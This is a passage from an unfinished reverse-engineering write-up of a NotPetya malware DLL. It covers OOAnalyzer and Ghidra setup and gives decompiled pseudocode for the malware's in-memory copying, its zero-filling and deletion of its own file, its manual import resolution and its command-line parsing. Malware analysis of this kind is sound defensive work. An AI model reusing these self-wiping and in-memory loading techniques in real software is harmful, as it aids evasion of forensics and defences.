Next we see a memory section from the `dll_malware_buffer` being copied into the just allocated virtual memory. It seems as if we are trying to load something from the DLL at a specific offset. The [memcpy](http://www.cplusplus.com/reference/cstring/memcpy/) call also partially explains the casts we've been seeing as this function takes `(void*)` as it's arguments. It's worth noting that the difference between `_Src` and `_Dst` is `0x50` however `_Src` points to the current process while `_Dst` points to the in memory malware copy.

The function otherwise still looks rather complicated. Just to get an idea of what we'll be dealing with later with we quickly look at the 3 nested functions `FUN_10009322`, `FUN_100091fa` and `FUN_10009286`. Interestingly we see that the first two have their calling conventian marked as `__thiscall`. Unexpectedly we also see that the first argument is a `void *this`. From this we learn that we are looking at C++ code.

Now given that we've done our homework by watching [a series](https://www.youtube.com/watch?v=Q90uZS3taG0) on the reverse engineering of WannaCry. We realise that we should run OOAnalyzer to help us make more sense of the C++ code.

Following the [OOAnalyzer installation guide](https://github.com/cmu-sei/pharos/blob/master/INSTALL.md). We start by pulling their docker image.

```sh
sudo docker pull seipharos/pharos
```

Next we start an interactive session and map the local folder with the malware dll to `/dir` in the container.

```sh
sudo docker run --rm -it -v `pwd`:/dir seipharos/pharos
```

Next inside the container we move to the `dir` folder.

```sh
cd dir
```

Using a quick directory listing we can then verify that our malware is indeed linked.

```sh
ls -l
```

And finally we run OOAnalyzer and store the result in a `.json` file.

```sh
ooanalyzer -j 027cc450ef5f8c5f653329641ec1fed91f694e0d229928963b30f6b0d7d3a745.json 027cc450ef5f8c5f653329641ec1fed91f694e0d229928963b30f6b0d7d3a745
```

The next step is waiting a fair bit. After this we have ended up with a `.json` file the full analysis output being as follows.

```
OPTI[INFO ]: Analyzing executable: 027cc450ef5f8c5f653329641ec1fed91f694e0d229928963b30f6b0d7d3a745
OPTI[INFO ]: OOAnalyzer version 1.0.
OPTI[INFO ]: ROSE stock partitioning took 34.4457 seconds.
OPTI[INFO ]: Partitioned 47977 bytes, 16653 instructions, 4399 basic blocks, 1 data blocks and 341 functions.
OPTI[INFO ]: Pharos function partitioning took 34.9167 seconds.
OPTI[INFO ]: Partitioned 48640 bytes, 16787 instructions, 4437 basic blocks, 13 data blocks and 343 functions.
APID[WARN ]: API database has no data for DLL: DHCPSAPI
APID[WARN ]: API database has no data for DLL: IPHLPAPI
APID[WARN ]: API database could not find function WNetOpenEnumW in MPR
APID[WARN ]: API database could not find function WNetEnumResourceW in MPR
APID[WARN ]: API database could not find function WNetCancelConnection2W in MPR
APID[WARN ]: API database could not find function WNetAddConnection2W in MPR
APID[WARN ]: API database could not find function WNetCloseEnum in MPR
APID[WARN ]: API database has no data for DLL: NETAPI32
APID[WARN ]: API database could not find function wsprintfA in USER32
APID[WARN ]: API database could not find function wsprintfW in USER32
FSEM[ERROR]: Function 0x1000A5CC relative memory exceeded
FSEM[ERROR]: Function analysis convergence failed for: 0x1000A5CC
FSEM[ERROR]: Function 0x10007C10 has no out edges.
FSEM[ERROR]: Function 0x10005A7E relative memory exceeded
FSEM[ERROR]: Function analysis convergence failed for: 0x10005A7E
FSEM[ERROR]: Function 0x10007DEB has no out edges.
OOAN[ERROR]: No new() methods were found.  Heap objects may not be detected.
OOAN[ERROR]: No delete() methods were found.  Object analysis may be impaired.
OPTI[INFO ]: Function analysis complete, analyzed 178 functions in 81.6441 seconds.
OPTI[INFO ]: OOAnalyzer analysis complete, found: 5 classes, 5 methods, 0 virtual calls, and 10 usage instructions.
OPTI[INFO ]: Successfully exported to JSON file '027cc450ef5f8c5f653329641ec1fed91f694e0d229928963b30f6b0d7d3a745.json'.
OPTI[INFO ]: OOAnalyzer analysis complete.
```

Next we have to add the OOAnalyzer plugin to Ghidra so we can import our result. For this we first need to compile this plugin however for which [we follow the instructions](https://github.com/cmu-sei/pharos/tree/master/tools/ooanalyzer/ghidra/OOAnalyzerPlugin).

```sh
git clone https://github.com/cmu-sei/pharos.git
```

Next we change directory to the folder containing the plugin source libraries. And add the only dependency of OOAnalyzer, GSON 2.8.5.

```sh
cd pharos/tools/ooanalyzer/ghidra/OOAnalyzerPlugin/lib/
wget https://repo1.maven.org/maven2/com/google/code/gson/gson/2.8.5/gson-2.8.5.jar
```

Next we go up one directory so we cna build the plugin. The first thing we notice is that OOAnalyzer does not use the gradle wrapper, this means that we'll have to install gradle first.

```sh
cd ...
sudo apt-get install gradle
```

Given that there are no further compile details given we just run `gradle`. This gives us an error.

```
> GHIDRA_INSTALL_DIR is not defined!
```

So we do the next sensible thing which is actually checking the content of `build.gradle` where we immediately see some details about this exact error. So we try again.

```sh
gradle -PGHIDRA_INSTALL_DIR=/home/roan/Downloads/ghidra_9.1.2_PUBLIC_20200212/ghidra_9.1.2_PUBLIC
```

Next up we wait a bit. After a while we get back our plugin.

```
Created ghidra_9.1.2_PUBLIC_20200304_OOAnalyzerPlugin.zip in /home/roan/Downloads/2IC80/Project/ooanalyzer/pharos/tools/ooanalyzer/ghidra/OOAnalyzerPlugin/dist
```

Now we can import the plugin in Ghidra. We do so by going to File > Import Plugins and adding the plugin we just built. We get a message that we have to restart Ghidra.

Next we import the output generated json output from before in Ghidra by going to the new `CERT` menu. As expected this cleans up our C++ classes a lot. It also becomes clear that the function we were looking at is in fact simply invoking methods on a C++ style object.

```cpp
undefined4 FUN_10009590(uint param_1,HANDLE param_2,LPCWSTR param_3){
  SIZE_T dwSize;
  undefined *puVar1;
  void *_Src;
  SIZE_T dwSize_00;
  undefined *_Dst;
  int iVar2;
  int iVar3;
  BOOL BVar4;
  cls_10009322 *this;
  DWORD local_c;
  SIZE_T local_8;
  
  _Src = DLL_handle;
  if ((_DAT_1001f114 == 0) && (malware_dll_buffer != 0)) {
    dwSize = *(SIZE_T *)(*(int *)((int)DLL_handle + 0x3c) + 0x50 + (int)DLL_handle);
    local_8 = dwSize;
    _Dst = (undefined *)VirtualAlloc((LPVOID)0x0,dwSize,0x1000,4);
    if (_Dst != (undefined *)0x0) {
      allocated_memory = _Dst;
                    /* Allocated memory in the virtual process address space. The exact size is a
                       bit unclear but it is read-write memory. */
      memcpy(_Dst,_Src,dwSize);
      iVar3 = malware_dll_buffer;
      this = (cls_10009322 *)(*(int *)(malware_dll_buffer + 0x3c) + malware_dll_buffer);
      if (((this != (cls_10009322 *)0x0) && (*(uint *)&this[6].field_0x10 != 0)) &&
         (this[6].mbr_14 != 0)) {
        iVar2 = meth_10009322(this,*(uint *)&this[6].field_0x10);
        if ((((cls_100091fa *)(iVar2 + iVar3) != (cls_100091fa *)0x0) &&
            (iVar3 = meth_100091fa((cls_100091fa *)(iVar2 + iVar3),(int)_Dst), iVar3 != 0)) &&
           (iVar3 = FUN_10009286(_Dst), iVar3 != 0)) {
          (*(code *)(_Dst + (int)(FUN_100094a5 + -(int)DLL_handle)))
                    (param_1,param_2,param_3,0xffffffff);
        }
      }
      dwSize_00 = local_8;
      BVar4 = VirtualProtect(_Dst,local_8,4,&local_c);
      puVar1 = _Dst;
      dwSize = dwSize_00;
      if (BVar4 != 0) {
        while (dwSize != 0) {
          *puVar1 = 0;
          puVar1 = puVar1 + 1;
          dwSize = dwSize - 1;
        }
        VirtualFree(_Dst,dwSize_00,0x4000);
      }
    }
  }
  return 0;
}
```

The main issue we're now left with is that the members of these objects got a bit lost. We can see them being accessed but we cannot really see their definition. Why this is the case is clear when we look at the data type definition. Turns out that most of the object data is of the `undefined` type.

In any case the general structure is clear now. We see accesses to object members and fields accompanied by `null` checks. The most interesting part is then of course what happens if all of these `null` checks succeed. For the time being we'll make that assumption. We then arrive at the following line.

```cpp
(*(code *)(_Dst + (int)(FUN_100094a5 + -(int)DLL_handle)))(param_1,param_2,param_3,0xffffffff);
```

Earlier we took note of `FUN_100094a5` as this is the only internal reference to the `Ordinal_1` function. Although the decompiled syntax here is questionable at best, we can infer that this is most likely a function call. The way it is invoked is odd however as it seems to be 
invoked on the copy made of the malware DLL that is in memory. There's probably a good reason for this or it's because the decompiler is having trouble.

Either way this seems like a good point to take a closer look at `FUN_100094a5`. This function probably plays an important role in the general life cycle of the malware and the current function we're looking at it rather difficult to understand completely. So we might get some useful information by gathering information about the context its being used in first.

### FUN_100094a5

```cpp
void FUN_100094a5(uint param_1,HANDLE param_2,LPCWSTR param_3,HANDLE param_4){
  HANDLE hFile;
  HANDLE hHeap;
  LPVOID lpBuffer;
  BOOL BVar1;
  DWORD dwFlags;
  DWORD dwBytes;
  DWORD local_8;
  
  _DAT_1001f114 = FreeLibrary(DLL_handle);
  if (_DAT_1001f114 != 0) {
    DLL_handle = allocated_memory;
    hFile = CreateFileW(&dll_fully_qualified_path,0x80000000,1,(LPSECURITY_ATTRIBUTES)0x0,3,0,
                        (HANDLE)0x0);
    if (hFile != (HANDLE)0x0) {
      local_8 = GetFileSize(hFile,(LPDWORD)0x0);
      CloseHandle(hFile);
      hFile = CreateFileW(&dll_fully_qualified_path,0x40000000,0,(LPSECURITY_ATTRIBUTES)0x0,2,0,
                          (HANDLE)0x0);
      if (hFile != (HANDLE)0x0) {
        dwFlags = 8;
        dwBytes = local_8;
        hHeap = GetProcessHeap();
        lpBuffer = HeapAlloc(hHeap,dwFlags,dwBytes);
        if (lpBuffer != (LPVOID)0x0) {
          WriteFile(hFile,lpBuffer,local_8,&local_8,(LPOVERLAPPED)0x0);
          dwBytes = 0;
          hHeap = GetProcessHeap();
          HeapFree(hHeap,dwBytes,lpBuffer);
        }
        CloseHandle(hFile);
      }
    }
    _DAT_1001f10c = DeleteFileW(&dll_fully_qualified_path);
    BVar1 = FUN_10009367();
    if (BVar1 != 0) {
      Ordinal_1(param_1,param_2,param_3,param_4);
    }
    ExitProcess(0);
  }
  return;
}
```

The first thing to recall when looking at this function is that we know that where we just came from invoked this function with the `INVALID_HANDLE` argument for `param_4`. Next we quickly check using Ghidra if there are any other references to this function. The answer to this is no. This is a bit odd as that would imply that `param_4` is always invalid.

The first thing we see happening is that the original dll handle [is freed](https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-freelibrary). In theory as far as we know this means that the reference count to the malware dll will reach 0 meaning it will get unloaded. The result of this call is stored in a global so we can rename this.

If this worked we see that the `DLL_handle` is then set to the in memory that was allocated in the function we came from. This makes appears to make it likely that the memory allocated and initilised then was actually a copy of the entire DLL address space. 

Next we see a [CreateFileW](https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilew) being used to open the dll file. Access is requested as `0x80000000` which maps to `GENERIC_READ`. Besides that the file is shared, no security attributes are used, it indicates to open an existing file, no flags are used and a `NULL` `HANDLE` is passed. All in all this just gets a `HANDLE` to the DLL file.

Assuming this actually worked the size of the file is gotten and stored in `local_8` so we can rename this. And then the handle to the original DLL is closed.

Next we see that the DLL is read again. But this time with different arguments. Access is requested as `0x40000000` which maps to `GENERIC_WRITE` in addition the file is not sharable this time and it is indicated that the file should be `CREATE_ALWAYS`. This allows overwritting the DLL. The returned handle to the now writeable file is stored in `hFile`.

If this returned handle is not `NULL`, then a few things happen.

First we see a new heap allocation being made that is large enough to store the original DLL. The flags are set to 8 which simply maps to `HEAP_ZERO_MEMORY` meaning the memory is initialised as all 0's.

Assuming the buffer was succesfully created and not a `NULL` pointer. Then a [WriteFile](https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-writefile) call is made. The arguments are rather simple and all that happens is that buffer that was just allocated is written to the DLL file. This effectively wipes the file since the buffer is all 0's.

After this is done we see some resource cleanup like the buffer being freed and the file handle closed.

Next we see a call being made to [DeleteFileW](https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-deletefilew), unsurprisingly this deletes the malware DLL file. The success state of this operation is stored in the global `_DAT_1001f10c` so we can rename this global and add a comment.

The next thing we see is a call to `FUN_10009367`. So this is where we will go next. The result of this function determines whether `Ordinal_1` is invoked so it ought to be important.

### FUN_10009367

```cpp
BOOL FUN_10009367(void){
  LPCSTR pCVar1;
  int iVar2;
  BOOL BVar3;
  FARPROC pFVar4;
  int *piVar5;
  FARPROC *ppFVar6;
  LPCSTR *ppCVar7;
  LPCSTR lpProcName;
  DWORD local_14;
  int local_10;
  HMODULE local_c;
  BOOL local_8;
  
  local_8 = 0;
  iVar2 = *(int *)(DLL_handle + 0x3c) + DLL_handle;
  piVar5 = (int *)(*(int *)(iVar2 + 0x80) + DLL_handle);
  if (piVar5 != (int *)0x0) {
    local_c = (HMODULE)0x0;
    local_10 = (uint)*(ushort *)(iVar2 + 0x14) + 0x18 + iVar2;
    if (*(ushort *)(iVar2 + 6) != 0) {
      local_14 = *(uint *)(iVar2 + 0xd8);
      do {
        if ((*(uint *)(local_10 + 0xc) <= local_14) &&
           (local_14 < *(int *)(local_10 + 8) + *(uint *)(local_10 + 0xc))) break;
        local_c = (HMODULE)((int)&local_c->unused + 1);
        local_10 = local_10 + 0x28;
      } while ((int)local_c < (int)(uint)*(ushort *)(iVar2 + 6));
    }
    iVar2 = local_10;
    BVar3 = VirtualProtect((LPVOID)(*(int *)(local_10 + 0xc) + DLL_handle),*(SIZE_T *)(local_10 + 8)
                           ,4,&local_14);
    if (BVar3 != 0) {
      local_8 = 1;
      if (*piVar5 != 0) {
        do {
          if (local_8 != 1) break;
          local_c = LoadLibraryA((LPCSTR)(piVar5[3] + DLL_handle));
          if (local_c == (HMODULE)0x0) {
            local_8 = 0;
          }
          else {
            ppFVar6 = (FARPROC *)(piVar5[4] + DLL_handle);
            ppCVar7 = (LPCSTR *)(*piVar5 + DLL_handle);
            while ((pCVar1 = *ppCVar7, iVar2 = local_10, pCVar1 != (LPCSTR)0x0 && (local_8 == 1))) {
              lpProcName = (LPCSTR)((uint)pCVar1 & 0x7fffffff);
              if (lpProcName == pCVar1) {
                lpProcName = lpProcName + DLL_handle + 2;
              }
              pFVar4 = GetProcAddress(local_c,lpProcName);
              *ppFVar6 = pFVar4;
              if (pFVar4 == (FARPROC)0x0) {
                local_8 = 0;
              }
              ppFVar6 = ppFVar6 + 1;
              ppCVar7 = ppCVar7 + 1;
            }
          }
          piVar5 = piVar5 + 5;
        } while (*piVar5 != 0);
        if (local_8 == 0) {
          return 0;
        }
      }
      local_8 = VirtualProtect((LPVOID)(*(int *)(iVar2 + 0xc) + DLL_handle),*(SIZE_T *)(iVar2 + 8),
                               local_14,&local_14);
    }
  }
  return local_8;
}
```

The first thing to note is that this function is actually surprisingly long and complex. In fact, it is fairly similar to `FUN_10009590` in the sense that we see similar `DLL_handle` offset pointers. On the bright side however, nothing is undefined here. Most likely that will make this all a bit easier to grasp.

Turns out that this function is based all around a double offset of the `DLL_handle` to specfic memory offets. We are still rather unsure as to what a double offset of the `DLL_handle` means. The main take away from this function is however that it load Libraries and exported functions from these libraries.

In addition some memory ranges get protected in `PAGE_READWRITE` mode. For now it's rather difficult to really understandt his function. The important part is that it returns `1` on success and `0` on failure of something. For now we will also rename the function to `load_libraries` as this seems most appropriate.

By extension we know that `Ordinal_1` is only invoked when this function did not fail. Most likely this means that all prerequiresite libraries are loaded.

Finally we see that either after library loading fails or after `Ordinal_1` returns the process is terminated using an [ExitProcess](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-exitprocess) call.

Next we return to `Ordinal_1` from the second entry point.

### Second entry to Ordinal_1

Back in `Ordinal_1` we see a call being made to `Ordinal_115`. We see that this is an external function exported by `WS2_32.dll` which is not currently present. So we do something very sensible and copy this file from a Windows PC from the `C:\\Windows\System32` directory.

```
                             **************************************************************
                             *                POINTER to EXTERNAL FUNCTION                *
                             **************************************************************
                             undefined Ordinal_115()
             undefined         AL:1           <RETURN>
                             115  Ordinal_115  <<not bound>>
                             PTR_Ordinal_115_1000d294                        XREF[1]:     Ordinal_1:10007e1e  
        1000d294 73 00 00 80     addr       WS2_32.DLL::Ordinal_115
        1000d298 00              ??         00h
        1000d299 00              ??         00h
        1000d29a 00              ??         00h
        1000d29b 00              ??         00h
```

After anaylzing the `Ordinal_115` function in `WS2_32.dll` we can update its signature in our NotPetya project. This reveals that the [WSAStartup](https://docs.microsoft.com/en-us/windows/win32/api/winsock/nf-winsock-wsastartup) function is called. The minimum version required is `0x202` and the Windows Sockets implementation details are stored in `DAT_1001f768`. So we can rename this global. This only initialises the Winsock DLL so it can be used.

Next we see two calls being made to `FUN_10007091` so lets analyse this function next.

### FUN_10007091

```cpp
LPCRITICAL_SECTION FUN_10007091(LONG param_1,ULONG_PTR param_2,PRTL_CRITICAL_SECTION_DEBUG param_3,int param_4){
  HANDLE hHeap;
  PRTL_CRITICAL_SECTION_DEBUG p_Var1;
  LPCRITICAL_SECTION lpCriticalSection;
  DWORD dwFlags;
  SIZE_T dwBytes;
  
  dwBytes = 0x34;
  dwFlags = 8;
  hHeap = GetProcessHeap();
  lpCriticalSection = (LPCRITICAL_SECTION)HeapAlloc(hHeap,dwFlags,dwBytes);
  if (lpCriticalSection != (LPCRITICAL_SECTION)0x0) {
    InitializeCriticalSection(lpCriticalSection);
    lpCriticalSection[1].RecursionCount = param_4;
    lpCriticalSection[1].LockCount = param_1;
    dwBytes = param_4 << 2;
    lpCriticalSection[1].SpinCount = param_2;
    dwFlags = 8;
    lpCriticalSection[1].OwningThread = (HANDLE)0x0;
    lpCriticalSection[2].DebugInfo = param_3;
    hHeap = GetProcessHeap();
    p_Var1 = (PRTL_CRITICAL_SECTION_DEBUG)HeapAlloc(hHeap,dwFlags,dwBytes);
    lpCriticalSection[1].DebugInfo = p_Var1;
    if (p_Var1 == (PRTL_CRITICAL_SECTION_DEBUG)0x0) {
      FUN_10007003();
      lpCriticalSection = (LPCRITICAL_SECTION)0x0;
    }
  }
  return lpCriticalSection;
}
```

In this function we see a space being allocated for a critical section. Next we look at the [MSDN documentation for InitializeCriticalSection](https://docs.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-initializecriticalsection).  

This function just appears to initialise some `LPCRITICAL_SECION` objects and to do so uses the passed parameters. One interesting part is the nested `FUN_10007003` function near the end. Which is only called then allocating space for the DebugInfo `p_Var1` fails. 

```cpp
void FUN_10007003(void){
  int **ppiVar1;
  int *piVar2;
  HANDLE hHeap;
  LPVOID unaff_ESI;
  DWORD dwFlags;
  LPVOID lpMem;
  uint local_8;
  
  if (unaff_ESI != (LPVOID)0x0) {
    if (*(int *)((int)unaff_ESI + 0x18) != 0) {
      local_8 = 0;
      if (*(int *)((int)unaff_ESI + 0x24) != 0) {
        do {
          ppiVar1 = (int **)(*(int *)((int)unaff_ESI + 0x18) + local_8 * 4);
          if (*ppiVar1 != (int *)0x0) {
            piVar2 = *ppiVar1;
            if (*piVar2 != 0) {
              if (*(code **)((int)unaff_ESI + 0x30) != (code *)0x0) {
                (**(code **)((int)unaff_ESI + 0x30))(*piVar2);
              }
              lpMem = **(LPVOID **)(*(int *)((int)unaff_ESI + 0x18) + local_8 * 4);
              dwFlags = 0;
              hHeap = GetProcessHeap();
              HeapFree(hHeap,dwFlags,lpMem);
            }
            lpMem = *(LPVOID *)(*(int *)((int)unaff_ESI + 0x18) + local_8 * 4);
            dwFlags = 0;
            hHeap = GetProcessHeap();
            HeapFree(hHeap,dwFlags,lpMem);
          }
          local_8 = local_8 + 1;
        } while (local_8 < *(uint *)((int)unaff_ESI + 0x24));
      }
      lpMem = *(LPVOID *)((int)unaff_ESI + 0x18);
      dwFlags = 0;
      hHeap = GetProcessHeap();
      HeapFree(hHeap,dwFlags,lpMem);
    }
    dwFlags = 0;
    hHeap = GetProcessHeap();
    HeapFree(hHeap,dwFlags,unaff_ESI);
  }
  return;
}
```

This function has no return value, no arguments and makes no references to any globals. Instead it simply tiers to free as much heap memory as possible it seems. For now we will just assume it is not that important. The only thing worth noting still is that the `ESI` register being used as offset to free data is the same register that was used in the calling function to store the critical section object. It could be that this is simply cleanup.

It also seems fair to rename `FUN_10007091` to `configure_critical_sections` if more details are required later we can find them here but everything seems fairly standard. In `Ordinal_1` we can then also rename a few things to get the following.

```cpp
critical_section_no_extra_debug = configure_critical_section(0x24,(ULONG_PTR)spincount_function,(PRTL_CRITICAL_SECTION_DEBUG)0x0,0xffff);
critical_section_with_extra_debug = configure_critical_section(8,(ULONG_PTR)spincount_function_for_pointers,(PRTL_CRITICAL_SECTION_DEBUG)critical_section_debug_info_function,0xff);
                    /* Is a null pointer */
null_critical_section = (LPCRITICAL_SECTION)0x0;
```

These global are now easy to recognize when encountered later and the function at least have descriptive names.

We now continue with `Ordinal_1`.

### Back to Ordinal_1 again

The first thing we see after these critical sections are configured is the initialisation of a new `LPCRITICAL_SECTION` object using a [InitializeCriticalSection](https://docs.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-initializecriticalsection) call with the critical section being stored in the not yet encountered `DAT_1001f124` global. We'll rename the global to `critical_section_no_config`.

Moving on to the next line we see `FUN_10006a2b` being invoked with `param_3`.

### FUN_10006a2b (handle_cmd_args)

```cpp
undefined4 FUN_10006a2b(LPCWSTR param_1){
  WCHAR WVar1;
  LPCWSTR lpFirst;
  LPWSTR *hMem;
  int iVar2;
  LPWSTR pWVar3;
  uint uVar4;
  uint local_8;
  
  if (param_1 != (LPCWSTR)0x0) {
    lpFirst = param_1;
    do {
      WVar1 = *lpFirst;
      lpFirst = lpFirst + 1;
    } while (WVar1 != L'\0');
    if ((int)((int)lpFirst - (int)(param_1 + 1)) >> 1 != 0) {
      local_8 = 0;
      hMem = CommandLineToArgvW(param_1,(int *)&local_8);
      if (hMem != (LPWSTR *)0x0) {
        if (0 < (int)local_8) {
          iVar2 = StrToIntW(*hMem);
          uVar4 = 1;
          if (0 < iVar2) {
            DAT_1001f760 = iVar2;
          }
          if (1 < local_8) {
            do {
              lpFirst = hMem[uVar4];
              pWVar3 = StrStrW(lpFirst,L"-h");
              if (lpFirst == pWVar3) {
                FUN_100069a2();
                break;
              }
              pWVar3 = StrChrW(lpFirst,L':');
              if (pWVar3 != (LPWSTR)0x0) {
                *pWVar3 = L'\0';
                FUN_10006de0(lpFirst,pWVar3 + 1,1);
              }
              uVar4 = uVar4 + 1;
            } while (uVar4 < local_8);
          }
        }
        LocalFree(hMem);
      }
    }
  }
  if (DAT_1001f760 == 0) {
    DAT_1001f760 = 0x3c;
  }
  return 0;
}
```

After a `NULL` check on the input parameter we first seen a search over this input string for the first `\0` character. This loops leaves `lpFirst` pointing to the character after this `\0` terminator. For clarity we rename some locals.

Next we seen an `if` statement with a peculiar guard:

```cpp
if ((int)((int)param_1_no_nul - (int)(param_1 + 1)) >> 1 != 0) {
```

The subtraction between `param_1_no_nul` and `param_1` effectively yields the size of the string in bytes. Since we know that this is a `LPCWSTR` we know it's elements are `WCHAR` and therefore each `2` bytes. The left shift by `1` therefore makes sense and effectively divides the total number of bytes by `2` leaving the actual length of the string. If this length is not `0` we continue. This is possible one of the weirdest `strlen` type functions I've ever seen.

Next we see a call being made to [CommandLineToArgvW](https://docs.microsoft.com/en-us/windows/win32/api/shellapi/nf-shellapi-commandlinetoargvw). The interesting thing here is that `param_1` is passed as argument, meaning we can go through the program and rename all instances of aliases of `param_1`, including `param_3` in `Oridinal_1` to `cmd_args` since we now know that this is what it is. In addition we can rename this function to something like `handle_cmd_args`.


TODO


 




Memory:
- `FUN_100094a5` - only internal reference to `Ordinal_1`
- `FUN_10009590` - difficult to grasp but invokes `FUN_100094a5`





















